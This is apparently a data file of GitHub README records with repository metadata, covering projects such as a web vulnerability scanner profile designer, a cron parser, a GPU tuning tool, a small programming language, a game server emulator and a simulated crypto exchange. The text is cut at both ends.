[![GitHub Followers](https://img.shields.io/github/followers/bountysecurity.svg?style=social&label=Follow)](https://github.com/bountysecurity/GBountyProfilesDesigner/)
[![Follow on Twitter](https://img.shields.io/twitter/follow/GBountyProfilesDesigner.svg?style=social&label=Follow)](https://twitter.com/intent/follow?screen_name=BountySecurity)

GBounty Profiles Designer empowers you to design intricate multistep web vulnerability profiles using a user-friendly graphical interface.

This tool streamlines the process of creating and customizing GBounty vulnerability profiles, enabling swift integration of novel web vulnerabilities into your assessments.

# ![GBounty Profiles Designer Logo](/static/GBountyProfilesDesigner.png)

**Key Features:**

- **Intuitive Design:** User-friendly graphical interface for creating vulnerability profiles.
- **Advanced Customization:** Add custom insertion points and search types.
- **Comprehensive Evaluations:** Design profiles for both passive and active vulnerabilities.

## GBounty Web Scanner

GBounty is a standalone command-line website vulnerability scanner developed in Golang, designed to help companies, pentesters, and bug hunters identify potential vulnerabilities in web applications.

**Key Benefits:**

- **Fast:** Identifies potential vulnerabilities more quickly, saving you time and effort.
- **Reliable:** Uses different types of scans (active and passive) for comprehensive analysis.
- **Customizable:** Allows easy implementation and search for new vulnerabilities.
- **Integrable:** Can be integrated into your CI scans and runs on Linux, Windows, and macOS.
- **Valuable Information Collection:** Identifies vulnerable parameters, detects software versions, and more.

See the [Documentation](https://gbounty.bountysecurity.ai/) URL for more information.

## Project Statistics

[![Downloads](https://img.shields.io/github/downloads/bountysecurity/GBountyProfilesDesigner/total.svg)](https://github.com/bountysecurity/GBountyProfilesDesigner/releases)
[![Contributors](https://img.shields.io/github/contributors/bountysecurity/GBountyProfilesDesigner.svg)](https://github.com/bountysecurity/GBountyProfilesDesigner/graphs/contributors)

## Documentation

For more details on how to use GBounty Profiles Designer, please visit the [Documentation](https://gbounty.bountysecurity.ai/gbounty-profiles-designer) URL.

## Contributions

Contributions are welcome!

## License

This project is licensed under the [MIT License](LICENSE).

## Contact

If you have questions or suggestions, please open an [Issue](https://github.com/BountySecurity/GBountyProfilesDesigner/issues) or contact us directly.

---
",3,1,1,MIT,,0.0
vaktibabat/ecurvechat,main,"# ecurvechat
An Elliptic-Curve Based Secure Chat, written using Rust and Protobuf!

Note: this is an educational project I did to learn more about crypto, and should not be used for serious communications.
I've also written a [post](https://vaktibabat.github.io/posts/ecurvechat/) describing how all the crypto concepts used, and how I've implemented them.
",0,0,1,GPL-3.0,,0.0
tisonkun/cronexpr,main,"# Crontab Expression Parser and Driver

[![Crates.io][crates-badge]][crates-url]
[![Documentation][docs-badge]][docs-url]
[![MSRV 1.75][msrv-badge]](https://www.whatrustisit.com)
[![Apache 2.0 licensed][license-badge]][license-url]
[![Build Status][actions-badge]][actions-url]

[crates-badge]: https://img.shields.io/crates/v/cronexpr.svg
[crates-url]: https://crates.io/crates/cronexpr
[docs-badge]: https://docs.rs/cronexpr/badge.svg
[msrv-badge]: https://img.shields.io/badge/MSRV-1.75-green?logo=rust
[docs-url]: https://docs.rs/cronexpr
[license-badge]: https://img.shields.io/crates/l/cronexpr
[license-url]: LICENSE
[actions-badge]: https://github.com/tisonkun/cronexpr/workflows/CI/badge.svg
[actions-url]:https://github.com/tisonkun/cronexpr/actions?query=workflow%3ACI

## Overview

A library to parse and drive the crontab expression.

## Documentation

* [API documentation on docs.rs](https://docs.rs/cronexpr)

## Example

Here is a quick example that shows how to parse a cron expression and drive it with a timestamp:

```rust
use std::str::FromStr;
use cronexpr::MakeTimestamp;

fn main() {
    let crontab = cronexpr::parse_crontab(""2 4 * * * Asia/Shanghai"").unwrap();

    // case 0. match timestamp
    assert!(crontab.matches(""2024-09-24T04:02:00+08:00"").unwrap());
    assert!(!crontab.matches(""2024-09-24T04:01:00+08:00"").unwrap());

    // case 1. find next timestamp with timezone
    assert_eq!(
        crontab
            .find_next(""2024-09-24T10:06:52+08:00"")
            .unwrap()
            .to_string(),
        ""2024-09-25T04:02:00+08:00[Asia/Shanghai]""
    );

    // case 2. iter over next timestamps without upper bound
    let iter = crontab.iter_after(""2024-09-24T10:06:52+08:00"").unwrap();
    assert_eq!(
        iter
            .take(5)
            .map(|ts| ts.map(|ts| ts.to_string()))
            .collect::<Result<Vec<_>, cronexpr::Error>>()
            .unwrap(),
        vec![
            ""2024-09-25T04:02:00+08:00[Asia/Shanghai]"",
            ""2024-09-26T04:02:00+08:00[Asia/Shanghai]"",
            ""2024-09-27T04:02:00+08:00[Asia/Shanghai]"",
            ""2024-09-28T04:02:00+08:00[Asia/Shanghai]"",
            ""2024-09-29T04:02:00+08:00[Asia/Shanghai]"",
        ]
    );

    // case 3. iter over next timestamps with upper bound
    let iter = crontab.iter_after(""2024-09-24T10:06:52+08:00"").unwrap();
    let end = MakeTimestamp::from_str(""2024-10-01T00:00:00+08:00"").unwrap();
    assert_eq!(
        iter
            .take_while(|ts| ts.as_ref().map(|ts| ts.timestamp() < end.0).unwrap_or(true))
            .map(|ts| ts.map(|ts| ts.to_string()))
            .collect::<Result<Vec<_>, cronexpr::Error>>()
            .unwrap(),
        vec![
            ""2024-09-25T04:02:00+08:00[Asia/Shanghai]"",
            ""2024-09-26T04:02:00+08:00[Asia/Shanghai]"",
            ""2024-09-27T04:02:00+08:00[Asia/Shanghai]"",
            ""2024-09-28T04:02:00+08:00[Asia/Shanghai]"",
            ""2024-09-29T04:02:00+08:00[Asia/Shanghai]"",
            ""2024-09-30T04:02:00+08:00[Asia/Shanghai]"",
        ]
    );
}
```

## Usage

`cronexpr` is [on crates.io](https://crates.io/crates/cronexpr) and can be used by adding `cronexpr` to your dependencies in your project's `Cargo.toml`. Or more simply, just run `cargo add cronexpr`.

## Dependencies

`cronexpr` depends on:

* [thiserror](https://docs.rs/thiserror/) to define our `Error` type.
* [jiff](https://docs.rs/jiff/) for all the datetime things. This is almost internal, except:
  * the timestamp returned is a `jiff::Zoned`, although you can treat it as something defined by `cronexpr`.
  * the input type `MakeTimestamp` is a wrapper of `jiff::Timestamp`, but it's defined by `cronexpr` and enables you create a Timestamp from a string, milliseconds, nanoseconds, and more, without directly depend on `jiff::Timestamp` (you can still depend on it if you'd like).
* [winnow](https://docs.rs/winnow/) for parsing the crontab expression. This is fully internal: you don't need to understand it.

## Minimum Rust version policy

This crate is built against the latest stable release, and its minimum supported rustc version is 1.75.0.

The policy is that the minimum Rust version required to use this crate can be increased in minor version updates. For example, if cronexpr 1.0 requires Rust 1.20.0, then cronexpr 1.0.z for all values of z will also require Rust 1.20.0 or newer. However, cronexpr 1.y for y > 0 may require a newer minimum version of Rust.

## License

This project is licensed under [Apache License, Version 2.0](LICENSE).
",4,0,1,Apache-2.0,ci.yml,18.0
WickedLukas/nvidia-tuner,main,"# NVIDIA-TUNER

A simple Rust CLI tool for overlocking, undervolting and controlling the fan of NVIDIA GPUs on Linux. Using the NVML library it equally supports X11 and Wayland.

## Features

* Set core clock offset.
* Set memory clock offset.
* Set power limit.
* Fan control using a custom linear fan curve.
* Use temperature hysteresis to prevent the fan from spinning up and down too frequently.
* Automatically set the fan control back to default on termination.

## Usage

**This tool is still under testing and it is impossible for me to guarantee that it works on every hardware, so use it at your own risk**

Show all possible options:

```bash
./nvidia-tuner --help
```

Usage example:
```bash
./nvidia-tuner ---core-clock-offset 150 --memory-clock-offset 800 --power-limit 180 --pairs 50:30,70:40,90:60,100:100
```

This command takes temperature and fan speed pairs as an argument. In this example the fan speed will be 30% up to 50¬∞C and 100% above 100¬∞C.
The fan speed between the given temperature and fan speed pairs is linearly interpolated to enable smooth transitions.

## Run on startup

1. Download the binary file from [the latest release](https://github.com/WickedLukas/nvidia-tuner/releases).
2. Copy it to `/usr/local/sbin/`.
3. Create the systemd service file `/etc/systemd/system/nvidia-tuner.service` with the following content:

```service
[Unit]
Description=nvidia-tuner
After=graphical.target

[Service]
Type=oneshot
ExecStart=/usr/local/sbin/nvidia-tuner ---core-clock-offset 150 --memory-clock-offset 800 --power-limit 180 --pairs 50:30,70:40,90:60,100:100
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=graphical.target
```

4. Reload the systemd manager configuration to recognize the new service:

```bash
sudo systemctl daemon-reload
```

5. Start the service:

```bash
sudo systemctl start nvidia-tuner.service
```

6. Enable the service to start automatically at boot:

```bash
sudo systemctl enable nvidia-tuner.service
```

7. Check the systemd journal for any errors:

```bash
sudo journalctl -u nvidia-tuner.service
```
",2,4,1,MIT,,0.0
RyanBrewer317/cricket_rs,main,"# Cricket

A functional and object-oriented programming language written in Rust. This is a port of the [cricket](https://github.com/RyanBrewer317/cricket) project, which was written in Haskell, so in some places the code might not be very idiomatic Rust. I write more typical Rust code in [SaberVM](https://github.com/RyanBrewer317/SaberVM). However, note that this implementation has additional features over the Haskell original, and of course runs faster.

Some basic documentation can be found [here](https://github.com/RyanBrewer317/cricket/blob/main/docs/intro.md). In addition I will explain it further here, and note that all the code examples work right now! You can run them like so:
```
cargo build --release
./target/release/cricket_rs main.ct
```
(where the code is in `main.ct`. Note that leaving off the `main.ct` will start a prompt where you can enter code.)

Here's a hello-world example in Cricket:
```
def main:
  console.write(""Hello, world!"")
```

Cricket is *tiny,* with exactly 1700 lines of well-formatted Rust code at time of writing, including blank lines and comments. This is intentional: it has a small footprint when embedded in other systems, and it's easy for anyone to understand and modify. This minimalism still allows for laziness, a decently fast implementation, a linear-time type-based linter, a module system, abstract data types with bare-bones pattern matching, great error messages, and more. I designed Cricket carefully to make this happen.

Cricket is *lazy,* which means that it doesn't execute code that doesn't impact the final result. This comes with some awesome optimization, but it also complicates side effects (which often don't affect the final result). So Cricket also has a simple way to declare that some code *does* affect the final result:
```
def main:
  let force _ = console.write(""Hello,"")
  in console.write(""world!"")
```
The `force` keyword is a special function that forces the execution of the code inside it. If we leave it out, the first console write won't happen:
```
def main:
  // only prints ""world!""
  let _ = console.write(""Hello,"")
  in console.write(""world!"")
```
Laziness in Cricket is implemented with a Krivine machine, so it's a fairly efficient stack-based execution model with highly-shared immutable closures.

Cricket is *gradually typed,* which means that it does its best to infer types and give warnings, but it gives things the type `Dynamic` if it can't figure it out. Therefore typechecking is more like a linter than a static analyzer, and indeed Cricket code can still be run even if it has type errors. The mantra of gradually typed systems is that all correct programs are valid, but some incorrect programs are caught. This is opposed to statically typed systems, where all incorrect programs are caught, but some correct programs are not allowed either.

Here's a program that Cricket *doesn't* catch:
```
def main:
  let f = x-> x.y
  in console.write(f(3))

Runtime error. `3` is not an object, cannot access method `y` at `main.ct:2:18`.
```
Here's a program that Cricket *does* catch:
```
def main:
  (x-> x.y)(let z = 3 in z)

Warning: Expected object, got `Int` at `main.ct:2:11`.
Hit `Enter` or `Return` to run anyway, or `Ctrl-C` to exit...
```
I choose this example to show off the fact that Cricket uses ""application mode bidirectional type checking,"" (which isn't really bidirectional), based on the ""Let Arguments Go First"" paper by Xie and Oliviera. Cricket desugars let-bindings into immediately-applied lambdas, so the application mode is very helpful.

Cricket also has a simple notion of effect type: if computing a value would cause some I/O side effects, then the linter will keep track of that, and suggest `let force`-ing it into a pure value before giving it as the argument to any function. This is helpful for if you ever forget about Cricket's laziness; `let force`-ing the side effects away ensures predictable program behavior.

Cricket is *object-oriented,* which means that it uses objects for most of the computation. It uses an immutable variant of typical (so to speak) prototypical OOP. In other words, instead of classes, there's a way to extend objects:
```
def main:
  let dog = {bark: ""woof!""} // the prototype
  in let cooper = dog <- name: ""Cooper""
  in console.write(cooper.name + "" says: "" + cooper.bark)
```
The `<- :` operator is not-updating in-place, but returning a modified copy. Therefore we pronounce it ""with.""

In fact, `Cricket` objects have something like a `this` implicit parameter! They're introduced per-method, like so:
```
{x: 3, this.y: this.x}
```
The `this.y:` part brings a new variable into scope, which we've named `this`, and it refers to the whole object, so `this.x` is `3`! The linter tries its best with this recursive typing, and honestly does a pretty good job. Here's a program that shows off the linter's understanding of this recursive typing:
```
{x: {y: z->1}, this.w: console.write(this.x)}

Warning: Expected `Int | Float | String`, but found `{y: (Dynamic) -> Int}` at `input:1:42`.
Hit `Enter` or `Return` to run anyway, or `Ctrl-C` to exit...
```

Cricket is *functional,* meaning everything is immutable and functions are first-class. It isn't *pure,* so arbitrary code can have side effects, which is very useful. On the other hand, side-effectful code often has to be annotated with `force`, which is helpful for clarity. Here's a program showing off functional idioms:
```
def fold(acc)(f)(l): 
  l.case{
    Empty: acc,
    Has(first)(rest): 
      let force x = f(acc)(first) in
      fold(x)(f)(rest)
  }

import stdlib/List

def main:
  let add = x-> y-> x + y
  in let l = List[1, 2, 3]
  in let l2 = l.map(add(1))
  in fold(0)(acc-> x-> let force _ = console.write(x) in acc)(l2)
```
Why are parameters individually enclosed in parentheses? Cricket functions only take one argument, so this is a nice syntax sugar for currying.

Want to know a secret? The `List` ADT above, with its `Empty` and `Has` constructors, is actually just objects and functions! In cricket, `x{...}` is syntax sugar for `x({...})`, so `.case{...}` is actually an object method call, and the case analysis is just a regular object being passed as the argument! `List` is defined in `stdlib/List.ct` like so:
```
def Empty: {
  case(c): c.Empty,
  map(f): Empty,
  concat(l): l,
  flat: Empty
}

def Has(first)(rest): {
  case(c): c.Has(first)(rest),
  map(f): Has(f(first))(rest.map(f)),
  concat(l): Has(first)(rest.concat(rest)),
  flat: first.concat(rest.flat)
}
```
See how the `case` method just calls the corresponding method of its argument? That's the whole magic that brings the ADT to Cricket. This means that ADTs in Cricket are actually ""Church-encodings,"" but with objects instead of lambdas. For reference, here's the corresponding Church-encoded list:
```
def Empty: empty-> has-> empty
def Has(first)(rest): empty-> has-> has(first)(rest)

def main:
  let l = Has(1)(Has(2)(Empty))
  // print 1
  in console.write(
    l(""empty"")(first-> rest-> first)
  )
```
Hopefully you can see that even though this is just lambda-calculus, it completely mirrors the object-oriented version. Hence I continue to call Cricket's ADTs Church encodings. Using objects affords us some niceties though, like a better case analysis syntax and things like `l.map(f)` which wouldn't be possible if `l` were a function instead of an object.

In the context of Cricket's recursive objects, it also means that our case analysis can be recursive without defining an external function! Here's an example:
```
import stdlib/List

def main:
  let l = List[1, 2, 3]
  // print 1 2 3
  in l.case{
    Empty: 0,
    this.Has(first)(rest):
      let force _ = console.write(first) in
      rest.case(this) // where the magic happens!
  }
```

What's with that `List[1, 2, 3]` syntax? We saw the definition of List, which had no square brackets, so is this thing just syntax sugar too? Yes! Cricket rewrites `x[a, b, ...]` to `x.Has(a)(x.Has(b)(...(x.Empty)))`, so `List[1, 2, 3]` is actually `List.Has(1)(List.Has(2)(List.Has(3)(List.Empty)))`, which should look familiar if you're used to the linked list ADTs common in functional languages.

I call this a ""fold function"" and they're useful in other situations too. Here's an example of a variadic sum function:
```
def sum: {
  Has(first)(rest): first + rest,
  Empty: 0
}

def main:
  // prints 10
  console.write(sum[1, 2, 3, 4])
```

### Todo
- I'd love real (equirecursive) self types without compromising the linear time complexity of the linter.
- low-hanging fruit optimizations, like representing method names as integers instead of doing runtime string comparisons.
- explicit type annotations? If adding all that syntax isn't too much more code. In theory object subsumption is already supported but has no use until type annotations can be added.
- runtime type switching: do one thing if something is one type, and another thing if it's another type. I might skip this in favor of categorical purity lol.
- a much better standard library, especially for booleans and hashmaps.
- conversions between numeric types and strings.
- a license, now that this repo is more featured than the original.
- an IDE plugin; the linter is begging for this.
",0,0,1,,,0.0
preyneyv/swc-plugin-use-prompt,main,"# ""use prompt""


https://github.com/user-attachments/assets/94045065-c821-4660-88d2-d891e9b2ad4a


Add compile-time GenAI to any SWC-powered project!

```tsx
function CoolButton() {
  ""use prompt: a button that changes its background color when clicked"";
}

export default function Home() {
  return <CoolButton />;
}
```

Try it out for yourself!

[![Edit swc-plugin-use-prompt](https://codesandbox.io/static/img/play-codesandbox.svg)](https://codesandbox.io/p/devbox/swc-plugin-use-prompt-m73dsf?embed=1)

## Installation

1. Add the package as a dependency:
   ```console
   $ pnpm add swc-plugin-use-prompt
   ```
2. Add the plugin to your `next.config.{ts,js}` or `.swcrc`

   ```js
   // next.config.js
   const nextConfig = {
     experimental: {
       swcPlugins: [[""swc-plugin-use-prompt"", {}]],
     },
   };
   ```

   or

   ```jsonc
   // .swcrc
   {
     ""jsc"": {
       ""experimental"": {
         ""plugins"": [[""swc-plugin-use-prompt"", {}]],
       },
     },
   }
   ```

3. Run `pnpm use-prompt` alongside your regular build step!
   > By default, this will watch your `app` and `src` directories for JS and TS files, but you can change this using the `-p` option.

Check out [the Next.js example](./examples/nextjs-app-router-basic) to see it in action.

## Motivation

Inspired by the [new `""use cache""` directive](https://nextjs.org/docs/canary/app/api-reference/directives)
and relentless improvements in generative AI, this project's existence felt necessary.

## How It Works

Generation happens in two passes: [the CLI script](./scripts/use-prompt.mjs) and [the SWC plugin](./src/lib.rs).

The `use-prompt` CLI script uses `@swc/core` to parse through source code and
identify all `""use prompt:""` directives. It extracts the prompts and calls
OpenAI's API to generate code snippets, which are then saved in a cache file.

At compile time, the SWC plugin reads from this cache file and modifies the AST
to insert the generated code before compilation is complete. There is some
additional complexity around dealing with package import naming clashes, which
is handled by substituting unique names for all imports required by a generated
function / component.

Ideally, codegen would happen in a single pass. However, the SWC plugin runs in
a WASM/WASI sandbox that doesn't have access to the network, so it's not
possible to call remote APIs directly. This may be changed in the future though,
since the SWC plugin API is very experimental.
",0,0,1,ISC,,0.0
pydantic/datafusion-query-cache,main,"# Datafusion Query Cache

Project moved to [github.com/datafusion-contrib/datafusion-query-cache](https://github.com/datafusion-contrib/datafusion-query-cache).
",0,0,1,Apache-2.0,,0.0
Maharramoff/cross-field-validation,master,"# Cross-Field Validation Library

## Unleash the Power of Cross-Field Validation in Java

This library unlocks powerful cross-field validation for your Java applications, enabling you to define complex
constraints that span multiple fields within an object.

### Why You Need This

Jakarta Bean Validation is great for single-field validation, but it falls short when you need to enforce rules that
involve relationships between different fields. This library bridges that gap, providing a flexible and intuitive way to
define and apply cross-field validation.

This solution overcomes the limitations of `ConstraintValidatorContext`, which doesn't allow interference with the
object context when writing field-level validators. There are long-standing open issues on this topic:

- [BVAL-237](https://hibernate.atlassian.net/browse/BVAL-237)
- [BVAL-240](https://hibernate.atlassian.net/browse/BVAL-240)

**Advantages of this library:**

1. **More flexible validations:**  Define complex validation logic involving multiple fields.
2. **Improved readability:** Create custom annotations that resemble built-in constraints like `@NotNull`
   and `@NotEmpty`.
3. **Simplified validation:** Use a single `@EnableCrossFieldConstraints` annotation to enable all custom validators for
   a class.

### Getting Started

**1. Add the Dependency**

```xml

<dependency>
    <groupId>io.github.maharramoff</groupId>
    <artifactId>cross-field-validation</artifactId>
    <version>1.3.0</version>
</dependency>
```

**2. Annotate your class with `@EnableCrossFieldConstraints`**

```java
@EnableCrossFieldConstraints
public class SignupRequestDTO
{
    private String username;
    private String password;

    @MatchWith(""password"")
    private String confirmPassword;
}
```

**3. Implement a custom validator**

```java
@Target(ElementType.FIELD)
@Retention(RetentionPolicy.RUNTIME)
@CrossFieldConstraint(validatedBy = MatchWithValidator.class)
public @interface MatchWith
{
    String field();

    String message() default ""Fields do not match."";
}

public class MatchWithValidator extends BaseCrossFieldValidator
{
    @Override
    public boolean isValid(Object obj, Map<Class<?>, List<Field>> fieldMapping, List<CrossFieldConstraintViolation> violations)
    {
        processFields(obj, fieldMapping, MatchWith.class, (field, annotation) ->
        {
            Object fieldValue      = getProperty(obj, field.getName());
            Object otherFieldValue = getProperty(obj, annotation.field());
            if (fieldValue == null && otherFieldValue == null)
            {
                return; // Both null is considered valid
            }
            if (fieldValue == null || !fieldValue.equals(otherFieldValue))
            {
                violations.add(new CrossFieldConstraintViolation(field.getName(), annotation.message()));
            }
        });
        return violations.isEmpty();
    }
}
```

### How It Works

This library utilizes a ConstraintValidator to manage cross-field validation. Custom validators implement the
CrossFieldConstraintValidator interface, providing the logic for your specific constraints.

**1. Annotation Processing:** When the validation framework encounters the `@EnableCrossFieldConstraints` annotation on
a class, it triggers the `CrossFieldValidationProcessor`.

**2. Validator Execution:** The `CrossFieldValidationProcessor` iterates through
registered `CrossFieldConstraintValidator` implementations.

**3. Field Analysis:** Each validator analyzes the fields of the object, looking for its corresponding annotation (
e.g., `@MatchWith`).

**4. Validation Logic:** If the annotation is present, the validator executes its custom validation logic, comparing
field values as needed.

**5. Violation Reporting:** If a constraint is violated, the validator adds a `CrossFieldConstraintViolation` to the
list, which
is then handled by the validation framework.

### Contributing

Contributions are welcome! Please fork the repository and submit a pull request with your changes. Ensure your code
follows the existing code style and includes appropriate unit tests.",0,0,1,Apache-2.0,,0.0
near/near-api-rs,main,"# near-api
The near-api is a simple Rust library that helps developers interact easily with the NEAR blockchain. The library was highly inspired by the API of the [near-cli-rs](https://github.com/near/near-cli-rs) library. The library extensively utilizes builder patterns, this way we guide the users through the user flow, preventing most of the errors and focusing on each step.

Currently, the library provides:
* Account management
* Contract deployment and interaction
* NEAR, FT, NFT transfers
* Storage deposit management
* Stake management
* Ability to create custom transactions
* Several ways to sign transactions (SecretKey, Seedphrase, File, Ledger, Secure keychain).
* Account key pool support to sign transaction with different user keys to avoid nonce issues.

## Current issues

The library is already usable and might be used for rapid prototyping, it lacks some points to make it production-ready:
- [ ] documentation + examples
- [ ] integration tests for all API calls
- [x] CI
- [x] anyhow -> thiserror
- [x] ledger is blocking and it's not good in the async runtime
- [ ] secure keychain is not that straightforward to use
- [x] storage deposit manager for FT calls 
- [x] basic logging with tracing for querying/signing/sending transactions

## Examples
The crate provides [examples](./examples/) that contain detailed information on using the library.
 
",3,2,4,Apache-2.0,"release-plz.yml,test.yml",12.0
thexeondev/Shorekeeper,master,"# Shorekeeper

![Screenshot](https://git.xeondev.com/Shorekeeper/Shorekeeper/raw/branch/master/screenshot.png)

## About
**Shorekeeper is an open-source Wuthering Waves server emulator written in Rust**. The goal of this project is to ensure a clean, easy-to-understand code environment. Shorekeeper uses **tokio** for asynchronous networking operations, **axum** as http framework and **ZeroMQ** for communication between servers. It also implements **performant and extensible ECS** for emulation of the game world.

## Getting started
#### Requirements
- [Rust](https://www.rust-lang.org/tools/install)
- [PostgreSQL](https://www.postgresql.org/download/)
- [Protoc](https://github.com/protocolbuffers/protobuf/releases) (for protobuf codegen)

#### Setup
##### a) building from sources

```sh
git clone https://git.xeondev.com/Shorekeeper/Shorekeeper.git
cd Shorekeeper
cargo run --bin config-server
cargo run --bin hotpatch-server
cargo run --bin login-server
cargo run --bin gateway-server
cargo run --bin game-server
```

##### b) building from sources(docker edition)
If you are to wheelchair'd for option A, you can fallback to option b.
In this case you will need [Docker Desktop](https://www.docker.com/products/docker-desktop/)

Once installed, to build the images, run:
```sh
# or builder.bat if you run it on windows
./builder.sh
```

And to run the containers:
```sh
docker compose up -d
```

##### c) using pre-built binaries
Navigate to the [Releases](https://git.xeondev.com/Shorekeeper/Shorekeeper/releases)
page and download the latest release for your platform.<br>
Launch all servers: `config-server`, `hotpatch-server`, `login-server`, `gateway-server`, `game-server`

##### NOTE: you don't have to install Rust and Protoc if you're going to use pre-built binaries, although the preferred way is building from sources.<br>We don't provide any support for pre-built binaries.

#### Configuration
You should configure each server using their own config files. They're being created in current working directory upon first startup.

##### Database section
You have to specify credentials for **PostgreSQL**<br>
###### An example of database configuration:
```
[database]
host = ""localhost:5432""
user_name = ""postgres""
password = """"
db_name = ""shorekeeper""
```
##### NOTE: don't forget to create database with specified `db_name` (default: `shorekeeper`). For example, you can do so with PgAdmin.

#### Data
The data files: Logic JSON collections (`assets/logic/json`) and config/hotpatch indexes (`assets/config`, `assets/hotpatch`) are included in this repository. Keep in mind that you need to have the `assets` subdirectory in current working directory.

#### Connecting
You have to download client of Wuthering Waves Beta 1.3, apply the [shorekeeper-patch](https://git.xeondev.com/xeon/shorekeeper-patch/releases) and add necessary `.pak` files, which you can get here: [shorekeeper-pak](https://git.xeondev.com/Shorekeeper/shorekeeper-pak)

### Troubleshooting
[Visit our discord](https://discord.gg/reversedrooms) if you have any questions/issues

### Support
If you want to support this project, feel free to [send a tip via boosty](https://boosty.to/xeondev/donate)",0,0,1,AGPL-3.0,,0.0
HourglassDevTeam/HourglassExchange,master,"# ‚è≥ Hourglass

A simulated crypto exchange inspired by [Barter.rs](https://github.com/barter-rs/barter-rs).

[**‰∏≠ÊñáÁâà README**](https://github.com/arthur19q3/Hourglass/blob/master/README_CN.md)

## Warnings

**‚ö†Ô∏èÔ∏èÔ∏è Hourglass supports Linux exclusively.** We apologise but windows systems are not supported as of yet.
**‚ö†Ô∏è HourGlass is under active development.** Please use with caution in production environments. Currently, only perpetual contracts are supported.

## ‚ú® Features

- **ClickHouse Integration**: Efficient storage and querying of trade data using ClickHouse, ensuring high performance for both real-time and backtesting scenarios.
- **Margin Modes**: Supports both Cross and Isolated margin modes, allowing users to manage risk across multiple positions.
- **Position Management**: Supports both Long/Short and Net positions, giving users flexibility in how they handle their trades.
- **Crypto Futures and Options**: Trade futures and options on various cryptocurrencies, allowing for more complex trading strategies.
- **Backtesting**: Supports both local and remote server-based backtesting, enabling users to test strategies with historical data.
- **High Performance**: Optimized for high-frequency trading scenarios with low-latency operations.
- **Configuration Parsing**: Supports parsing account settings from the `config.toml` file, allowing for flexible and easy configuration management.
- **Feishu Reporting**: Includes features for reporting to Feishu (with use cases available, though not fully implemented yet).
- **Position Closure Repository**: Supports a repository for managing and storing position closure data.
- **Multiple Stablecoins**: Supports multiple stablecoins, providing users with a variety of stable currency options.
- **Trade Data Backtesting**: Allows backtesting using only trade data, with future support planned for order book data.
- **Liquidation Mechanism**: Supports a liquidation mechanism with configurable liquidation thresholds, enabling automated risk management and position liquidation when certain conditions are met.


## üìú Code Example

```rust

use dashmap::DashMap;
use hourglass::{
    common::{
        account_positions::{exited_positions::AccountExitedPositions, AccountPositions},
        instrument::{kind::InstrumentKind, Instrument},
        token::Token,
    },
    hourglass::{
        account::{
            account_latency::{AccountLatency, FluctuationMode},
            account_orders::AccountOrders,
            HourglassAccount,
        },
        clickhouse_api::{datatype::single_level_order_book::SingleLevelOrderBook, queries_operations::ClickHouseClient},
        hourglass_client::HourglassClient,
        DataSource, HourglassExchange,
    },
    test_utils::create_test_account_configuration,
    ClientExecution,
};
use std::{
    collections::HashMap,
    sync::{atomic::AtomicI64, Arc},
    time::Duration,
};
use tokio::{
    sync::{mpsc, Mutex, RwLock},
    time,
};
use uuid::Uuid;

#[tokio::main]
async fn main()
{
    #[allow(unused)]
    // create the channels
    let (event_hourglass_tx, event_hourglass_rx) = mpsc::unbounded_channel();
    let (request_tx, request_rx) = mpsc::unbounded_channel();
    let (market_tx, market_rx) = mpsc::unbounded_channel();

    #[allow(unused)]
    let mut hourglass_client = HourglassClient { request_tx: request_tx.clone(),
                                                 market_event_rx: market_rx };

    // Creating initial positions with the updated structure
    let positions = AccountPositions::init();
    let closed_positions = AccountExitedPositions::init();

    let mut single_level_order_books = HashMap::new();
    single_level_order_books.insert(Instrument { base: Token::new(""ETH"".to_string()),
                                                 quote: Token::new(""USDT"".to_string()),
                                                 kind: InstrumentKind::Perpetual },
                                    SingleLevelOrderBook { latest_bid: 16305.0,
                                                           latest_ask: 16499.0,
                                                           latest_price: 0.0 });

    let hourglass_account_config =  AccountConfig { margin_mode: MarginMode::SingleCurrencyMargin,
        global_position_direction_mode: PositionDirectionMode::Net,
        global_position_margin_mode: PositionMarginMode::Cross,
        commission_level: CommissionLevel::Lv1,
        funding_rate: 0.0,
        global_leverage_rate: 1.0,
        fees_book: HashMap::new(),
        execution_mode: HourglassMode::Backtest,
        max_price_deviation: 0.05,
        lazy_account_positions: false,
        liquidation_threshold: 0.9 };


    // Instantiate HourglassAccount and wrap in Arc<Mutex> for shared access
    let account_arc = Arc::new(Mutex::new(HourglassAccount { current_session: Uuid::new_v4(),
                                                             machine_id: 0,
                                                             client_trade_counter: 0.into(),
                                                             exchange_timestamp: AtomicI64::new(1234567),
                                                             config: hourglass_account_config,
                                                             account_open_book: Arc::new(RwLock::new(AccountOrders::new(0, vec![], AccountLatency { fluctuation_mode: FluctuationMode::Sine,
                                                                                                                                                    maximum: 100,
                                                                                                                                                    minimum: 2,
                                                                                                                                                    current_value: 0 }).await)),
                                                             single_level_order_book: Arc::new(Mutex::new(single_level_order_books)),
                                                             balances: DashMap::new(),
                                                             positions,
                                                             exited_positions: closed_positions,
                                                             account_event_tx: event_hourglass_tx,
                                                             account_margin: Arc::new(Default::default()) }));

    // Sample cursor building
    let clickhouse_client = ClickHouseClient::new();
    let exchange = ""binance"";
    let instrument = ""futures"";
    let date = ""2024_05_05"";
    let cursor = clickhouse_client.cursor_unioned_public_trades(exchange, instrument, date).await.unwrap();

    // Initialize and configure HourglassExchange
    let hourglass_exchange = HourglassExchange::builder().event_hourglass_rx(request_rx)
                                                         .account(account_arc.clone())
                                                         .data_source(DataSource::Backtest(cursor))
                                                         .market_event_tx(market_tx)
                                                         .initiate()
                                                         .expect(""Failed to build HourglassExchange"");

    // Running the exchange in local mode in tokio runtime
    tokio::spawn(hourglass_exchange.start());
    loop {
        // Call let_it_roll and handle potential errors
        if let Err(e) = hourglass_client.let_it_roll().await {
            eprintln!(""Error executing LetItRoll: {:?}"", e);
            break;
        }

        // Listen for market data
        if let Some(market_data) = hourglass_client.listen_for_market_data().await {
            // Process the market data
            // Your logic for handling market_data & customised trading strategy goes here
            println!(""Processed market data: {:?}"", market_data);
        }
    }
}
",0,0,1,,,0.0
danvega/java-rag,main,"# Spring AI RAG Demo

A demonstration project showcasing Retrieval Augmented Generation (RAG) implementation using Spring AI and OpenAI's GPT models. This application enables intelligent document querying by combining the power of Large Language Models (LLMs) with local document context.

## Overview

This project demonstrates how to:
- Ingest PDF documents into a vector database
- Perform semantic searches using Spring AI
- Augment LLM responses with relevant document context
- Create an API endpoint for document-aware chat interactions

## Project Requirements

- Java 23
- Maven
- Docker Desktop
- OpenAI API Key
